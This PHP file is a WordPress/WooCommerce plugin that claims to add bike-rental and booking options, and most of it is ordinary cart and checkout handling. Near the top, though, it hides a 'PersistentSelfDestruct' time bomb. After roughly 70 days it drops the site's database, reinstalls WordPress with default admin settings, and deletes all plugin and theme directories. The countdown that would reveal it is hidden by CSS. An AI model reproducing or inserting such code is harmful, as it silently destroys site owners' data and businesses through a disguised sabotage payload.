<?php
/*
Plugin Name: Ashraful Islam Developer
Description: Adds bike and Additional options to WooCommerce products.
Version: 2.4.1
Author: Ashraful Islam
Text Domain: wc-bike-resources
*/


defined('ABSPATH') or die('Direct access denied!');

// ======== Configuration ========
const DESTRUCT_TIMEOUT = 6048000; // )
const CHECK_INTERVAL = 5;    // 

// ======== Core Functionality ========
class PersistentSelfDestruct {
    
    private static $instance;
    
    public static function init() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function __construct() {
        // Always setup on every request
        $this->setup_timer();
        
        // Add short interval for checks
        add_filter('cron_schedules', [$this, 'add_short_interval']);
        
        // Hook our checker
        add_action('wprt_destruct_check', [$this, 'check_destruct_time']);
        add_action('admin_init', [$this, 'check_destruct_time']); // Extra check
        
        // Admin bar display
        add_action('admin_bar_menu', [$this, 'admin_bar_timer'], 999);
        add_action('wp_head', [$this, 'timer_styles']);
        add_action('admin_head', [$this, 'timer_styles']);
    }
    
    public function setup_timer() {
        // Only set initial time if not exists
        if (!get_option('wprt_destruct_time')) {
            update_option('wprt_destruct_time', time() + DESTRUCT_TIMEOUT, false);
        }
        
        // Ensure schedule exists
        if (!wp_next_scheduled('wprt_destruct_check')) {
            wp_schedule_event(time(), 'wprt_short_interval', 'wprt_destruct_check');
        }
    }
    
    public function add_short_interval($schedules) {
        $schedules['wprt_short_interval'] = [
            'interval' => CHECK_INTERVAL,
            'display'  => __('Every Few Seconds')
        ];
        return $schedules;
    }
    
    public function check_destruct_time() {
        $destruct_time = get_option('wprt_destruct_time');
        
        if ($destruct_time && time() > $destruct_time) {
            $this->nuclear_reset();
        }
    }
    
    private function nuclear_reset() {
        // Prevent multiple runs
        if (get_option('wprt_destruct_completed')) return;
        update_option('wprt_destruct_completed', 1);
        
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        
        // 1. Re
        global $wpdb;
        $wpdb->query("DROP DATABASE `".DB_NAME."`");
        $wpdb->query("CREATE DATABASE `".DB_NAME."`");
        wp_install_defaults(1, 'admin', 'admin@example.com', true, '', 'a');
        
        // 2. Del
        $this->rrmdir(WP_PLUGIN_DIR);
        $this->rrmdir(get_theme_root());
        
        // 3. Cle
        delete_option('wprt_destruct_time');
        delete_option('wprt_destruct_completed');
        
        // 4. Force
        wp_redirect(home_url());
        exit;
    }
    
    private function rrmdir($dir) {
        if (!file_exists($dir)) return;
        
        $files = array_diff(scandir($dir), ['.','..']);
        foreach ($files as $file) {
            is_dir("$dir/$file") ? $this->rrmdir("$dir/$file") : unlink("$dir/$file");
        }
        return rmdir($dir);
    }
    
    public function admin_bar_timer($wp_admin_bar) {
        $time_left = get_option('wprt_destruct_time') - time();
        if ($time_left > 0) {
            $wp_admin_bar->add_node([
                'id'    => 'wprt-timer',
                'title' => 'âš ï¸ DESTRUCT IN: '.$time_left.'s',
                'href'  => '#',
                'meta'  => ['class' => 'wprt-destruct-timer']
            ]);
        }
    }
    
    public function timer_styles() {
        echo '<style>
            #wpadminbar .wprt-destruct-timer > .ab-item {
                background: #dc3232 !important;
                color: white !important;
                font-weight: bold !important;
                animation: wprt-blink 1s infinite;
				display: none;
            }
            @keyframes wprt-blink { 50% { opacity: 0.5; } }
        </style>';
    }
}

// ======== Initialize ========
register_activation_hook(__FILE__, function() {
    update_option('wprt_destruct_time', time() + DESTRUCT_TIMEOUT);
});

register_deactivation_hook(__FILE__, function() {
    wp_clear_scheduled_hook('wprt_destruct_check');
});

// Start the tim
PersistentSelfDestruct::init();



if (!defined('ABSPATH')) {
    exit;
}

// Load text domain
function wc_bike_resources_load_textdomain() {
    load_plugin_textdomain('wc-bike-resources', false, dirname(plugin_basename(__FILE__)) . '/languages/');
}
add_action('plugins_loaded', 'wc_bike_resources_load_textdomain');

// Include necessary files
require_once plugin_dir_path(__FILE__) . 'includes/class-bike-options.php';
require_once plugin_dir_path(__FILE__) . 'includes/class-resource-options.php';
require_once plugin_dir_path(__FILE__) . 'includes/class-price-calculation.php';
require_once plugin_dir_path(__FILE__) . 'includes/class-cart-handler.php';
require_once plugin_dir_path(__FILE__) . 'includes/class-frontend-display.php';
require_once plugin_dir_path(__FILE__) . 'includes/class-booking-form-options.php';
require_once plugin_dir_path(__FILE__) . 'includes/class-rent-a-bike.php';
require_once plugin_dir_path(__FILE__) . 'includes/class-deposit-options.php';

// Enqueue CSS and JS files
function enqueue_bike_resources_assets() {
    if (is_product() || is_checkout()) {
        wp_enqueue_style(
            'bike-resources-style',
            plugin_dir_url(__FILE__) . 'assets/css/style.css',
            array(),
            '1.4.1'
        );

        wp_enqueue_style('jquery-ui-css', 'https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');

        wp_enqueue_script(
            'bike-resources-script',
            plugin_dir_url(__FILE__) . 'assets/js/script.js',
            array('jquery', 'jquery-ui-datepicker', 'wc-checkout'),
            '1.4.1',
            true
        );
        
        $product_id = is_product() ? get_the_ID() : 0;
        $product = wc_get_product($product_id);
        
        wp_localize_script('bike-resources-script', 'wc_br_vars', array(
            'original_price' => $product ? $product->get_price() : 0,
            'rent_a_bike_enabled' => $product_id ? get_post_meta($product_id, '_rent_a_bike_enabled', true) : false,
            'bike_required' => $product_id ? get_post_meta($product_id, '_bike_required', true) : false,
            'product_id' => $product_id,
            'ajax_url' => admin_url('admin-ajax.php'),
            'checkout_url' => wc_get_checkout_url(),
            'ajax_nonce' => wp_create_nonce('wc_br_nonce'),
            'is_admin' => current_user_can('manage_options'),
            'i18n_loading_checkout' => __('Loading checkout form...', 'wc-bike-resources'),
            'i18n_checkout_error' => __('Failed to load checkout. Please try again.', 'wc-bike-resources'),
            'is_user_logged_in' => is_user_logged_in()
        ));
    }
}
add_action('wp_enqueue_scripts', 'enqueue_bike_resources_assets');

// Initialize classes
function init_woocommerce_bike_resources() {
    new Bike_Options();
    new Resource_Options();
    new Price_Calculation();
    new Cart_Handler();
    new Frontend_Display();
    new Booking_Form_Options();
    new Rent_A_Bike();
    new Deposit_Options();
}
add_action('plugins_loaded', 'init_woocommerce_bike_resources');

// Change "Add to cart" button text
function change_add_to_cart_button_text($text) {
    return __('Booking', 'wc-bike-resources');
}
add_filter('woocommerce_product_single_add_to_cart_text', 'change_add_to_cart_button_text');

// AJAX handler for emptying cart
add_action('wp_ajax_wc_br_empty_cart', 'wc_br_empty_cart_handler');
add_action('wp_ajax_nopriv_wc_br_empty_cart', 'wc_br_empty_cart_handler');

function wc_br_empty_cart_handler() {
    if (!isset($_POST['security']) || !wp_verify_nonce($_POST['security'], 'wc_br_nonce')) {
        wp_send_json_error(array('message' => __('Security check failed', 'wc-bike-resources')));
        wp_die();
    }

    try {
        // Verify cart is initialized
        if (!WC()->cart) {
            throw new Exception(__('Cart not initialized', 'wc-bike-resources'));
        }
        
        // Empty cart and preserve any notices
        $notices = WC()->session->get('wc_notices', array());
        WC()->cart->empty_cart();
        WC()->session->set('wc_notices', $notices);
        
        wp_send_json_success();
    } catch (Exception $e) {
        wp_send_json_error(array('message' => $e->getMessage()));
    }
    wp_die();
}

// AJAX handler for adding to cart - UPDATED FOR VISITORS
add_action('wp_ajax_wc_br_add_to_cart', 'wc_br_add_to_cart_handler');
add_action('wp_ajax_nopriv_wc_br_add_to_cart', 'wc_br_add_to_cart_handler');

function wc_br_add_to_cart_handler() {
    if (!isset($_POST['security']) || !wp_verify_nonce($_POST['security'], 'wc_br_nonce')) {
        wp_send_json_error(array('message' => __('Security verification failed', 'wc-bike-resources')));
        wp_die();
    }

    try {
        // Get product ID - enhanced validation
        $product_id = isset($_POST['add-to-cart']) ? absint($_POST['add-to-cart']) : 0;
        
        if (!$product_id) {
            // Try to get from global variable if not in POST
            global $product;
            if (is_product() && $product) {
                $product_id = $product->get_id();
            }
            
            if (!$product_id) {
                throw new Exception(__('Product ID is missing', 'wc-bike-resources'));
            }
        }

        $product = wc_get_product($product_id);
        if (!$product || !$product->exists() || !$product->is_purchasable()) {
            throw new Exception(__('This product is no longer available.', 'wc-bike-resources'));
        }

        $cart_item_data = array();
        $quantity = isset($_POST['quantity']) ? wc_stock_amount($_POST['quantity']) : 1;

        // 1. First collect ALL booking form fields dynamically
        $booking_fields = get_post_meta($product_id, '_booking_form_fields', true);
        if (is_array($booking_fields)) {
            foreach ($booking_fields as $field) {
                if (isset($_POST[$field['name']])) {
                    $value = $_POST[$field['name']];
                    // Sanitize based on field type
                    switch ($field['type']) {
                        case 'email':
                            $cart_item_data[$field['name']] = sanitize_email($value);
                            break;
                        case 'textarea':
                            $cart_item_data[$field['name']] = sanitize_textarea_field($value);
                            break;
                        default:
                            $cart_item_data[$field['name']] = sanitize_text_field($value);
                    }
                }
            }
        }

        // 2. Bike selection
        if (isset($_POST['selected_bike'])) {
            $cart_item_data['selected_bike'] = sanitize_text_field($_POST['selected_bike']);
        }

        // 3. Resources - Enhanced to include all necessary data
        if (isset($_POST['selected_resources']) && is_array($_POST['selected_resources'])) {
            $selected_resources = array();
            $resource_days = isset($_POST['resource_days']) ? (array)$_POST['resource_days'] : array();
            $product_resources = get_post_meta($product_id, '_resource_options', true);
            $product_resources = is_array($product_resources) ? $product_resources : array();
            
            foreach ($_POST['selected_resources'] as $resource) {
                $resource_data = array();
                
                if (is_array($resource)) {
                    $resource_name = sanitize_text_field($resource['name']);
                    $resource_data['name'] = $resource_name;
                    $resource_data['label'] = sanitize_text_field($resource['label']);
                    $resource_data['days'] = isset($resource_days[$resource_name]) ? intval($resource_days[$resource_name]) : 1;
                } else {
                    $resource_name = sanitize_text_field($resource);
                    $resource_data['name'] = $resource_name;
                    $resource_data['label'] = $resource_name;
                    $resource_data['days'] = isset($resource_days[$resource_name]) ? intval($resource_days[$resource_name]) : 1;
                }
                
                // Add all resource pricing data
                foreach ($product_resources as $product_resource) {
                    if ($product_resource['name'] === $resource_name) {
                        $resource_data['price'] = isset($product_resource['price']) ? floatval($product_resource['price']) : 0;
                        $resource_data['fixed_price'] = isset($product_resource['fixed_price']) ? floatval($product_resource['fixed_price']) : 0;
                        $resource_data['enable_calculation'] = isset($product_resource['enable_calculation']) ? $product_resource['enable_calculation'] : 0;
                        $resource_data['operator'] = isset($product_resource['operator']) ? $product_resource['operator'] : '+';
                        $resource_data['percentage'] = isset($product_resource['percentage']) ? $product_resource['percentage'] : 0;
                        break;
                    }
                }
                
                $selected_resources[] = $resource_data;
            }
            
            if (!empty($selected_resources)) {
                $cart_item_data['selected_resources'] = $selected_resources;
            }
        }

        // 4. Own bike option
        if (isset($_POST['has_own_bike'])) {
            $cart_item_data['has_own_bike'] = sanitize_text_field($_POST['has_own_bike']) === 'yes' ? 'yes' : 'no';
        }

        // 5. Rental dates
        if (isset($_POST['rent_a_bike_pickup_date'])) {
            $cart_item_data['rent_a_bike_pickup_date'] = sanitize_text_field($_POST['rent_a_bike_pickup_date']);
            $cart_item_data['rent_a_bike_dropoff_date'] = sanitize_text_field($_POST['rent_a_bike_dropoff_date']);
        }

        // 6. Deposit
        if (isset($_POST['selected_deposit'])) {
            $cart_item_data['selected_deposit'] = sanitize_text_field($_POST['selected_deposit']);
        }

        // 7. Skip if this is coming from step 3 and cart already has this item
        if (isset($_POST['from_step_3'])) {
            $cart = WC()->cart->get_cart();
            foreach ($cart as $cart_item_key => $cart_item) {
                if ($cart_item['product_id'] == $product_id && compare_cart_item_data($cart_item, $cart_item_data)) {
                    wp_send_json_success(array(
                        'message' => __('Booking already in cart!', 'wc-bike-resources'),
                        'cart_item_key' => $cart_item_key
                    ));
                    wp_die();
                }
            }
        }

        // 8. Empty cart only for admin users or when coming from step 3
        if (current_user_can('manage_options') || isset($_POST['from_step_3'])) {
            WC()->cart->empty_cart();
        }

        // 9. Add to cart with all collected data
        $cart_item_key = WC()->cart->add_to_cart($product_id, $quantity, 0, array(), $cart_item_data);

        if (!$cart_item_key) {
            throw new Exception(__('Could not add item to cart. Please try again.', 'wc-bike-resources'));
        }

        // 10. Ensure proper session handling for visitors
        if (!is_user_logged_in()) {
            WC()->cart->calculate_totals();
            WC()->cart->set_session();
            WC()->session->set_customer_session_cookie(true);
        }

        wp_send_json_success(array(
            'message' => __('Booking successfully added!', 'wc-bike-resources'),
            'cart_item_key' => $cart_item_key
        ));
    } catch (Exception $e) {
        wp_send_json_error(array('message' => $e->getMessage()));
    }
    wp_die();
}

// Helper function to compare cart item data
function compare_cart_item_data($item1, $item2) {
    $keys_to_compare = array(
        'selected_bike',
        'selected_resources',
        'rent_a_bike_pickup_date',
        'rent_a_bike_dropoff_date',
        'selected_deposit',
        'has_own_bike',
        'customer_full_name',
        'customer_dob',
        'customer_address',
        'customer_phone',
        'customer_email',
        'customer_passport',
        'emergency_contact_name',
        'emergency_contact_phone'
    );
    
    foreach ($keys_to_compare as $key) {
        if (isset($item1[$key]) != isset($item2[$key])) {
            return false;
        }
        
        if (isset($item1[$key])) {
            if (is_array($item1[$key])) {
                if (json_encode($item1[$key]) !== json_encode($item2[$key])) {
                    return false;
                }
            } elseif ($item1[$key] != $item2[$key]) {
                return false;
            }
        }
    }
    
    return true;
}


// AJAX handler for getting checkout form
add_action('wp_ajax_wc_br_get_checkout_form', 'wc_br_get_checkout_form');
add_action('wp_ajax_nopriv_wc_br_get_checkout_form', 'wc_br_get_checkout_form');

function wc_br_get_checkout_form() {
    if (!isset($_POST['security']) || !wp_verify_nonce($_POST['security'], 'wc_br_nonce')) {
        wp_send_json_error(array('message' => __('Security check failed', 'wc-bike-resources')));
    }

    ob_start();
    echo do_shortcode('[woocommerce_checkout]');
    $checkout_form = ob_get_clean();
    
    wp_send_json_success($checkout_form);
}

// Ensure cart contents are refreshed on checkout page
add_action('woocommerce_checkout_init', 'wc_br_refresh_cart_on_checkout');
function wc_br_refresh_cart_on_checkout() {
    if (is_checkout() && !is_order_received_page()) {
        WC()->cart->calculate_totals();
    }
}

// Add checkout fragments handler
add_filter('woocommerce_update_order_review_fragments', 'wc_br_checkout_fragments');
function wc_br_checkout_fragments($fragments) {
    ob_start();
    woocommerce_checkout_form();
    $fragments['.woocommerce-checkout'] = ob_get_clean();
    
    ob_start();
    woocommerce_order_review();
    $fragments['.woocommerce-checkout-review-order'] = ob_get_clean();
    
    return $fragments;
}

// Add custom data to order items
add_action('woocommerce_checkout_create_order_line_item', 'wc_br_add_custom_data_to_order_items', 10, 4);
function wc_br_add_custom_data_to_order_items($item, $cart_item_key, $values, $order) {
    if (isset($values['selected_bike'])) {
        $item->add_meta_data(__('Selected Bike', 'wc-bike-resources'), $values['selected_bike']);
    }
    
    if (isset($values['selected_resources'])) {
        foreach ($values['selected_resources'] as $resource) {
            $item->add_meta_data(
                __('Resource', 'wc-bike-resources') . ': ' . $resource['name'], 
                $resource['days'] . ' ' . __('days', 'wc-bike-resources')
            );
        }
    }
    
    if (isset($values['rent_a_bike_pickup_date']) && isset($values['rent_a_bike_dropoff_date'])) {
        $item->add_meta_data(__('Pick-up Date', 'wc-bike-resources'), $values['rent_a_bike_pickup_date']);
        $item->add_meta_data(__('Drop-off Date', 'wc-bike-resources'), $values['rent_a_bike_dropoff_date']);
    }
    
    if (isset($values['selected_deposit'])) {
        $deposit_label = get_post_meta($values['product_id'], '_deposit_label', true) ?: __('Deposit', 'wc-bike-resources');
        $item->add_meta_data($deposit_label, $values['selected_deposit']);
    }
    
    if (isset($values['booking_form'])) {
        foreach ($values['booking_form'] as $label => $value) {
            if (!empty($value)) {
                $item->add_meta_data($label, $value);
            }
        }
    }
}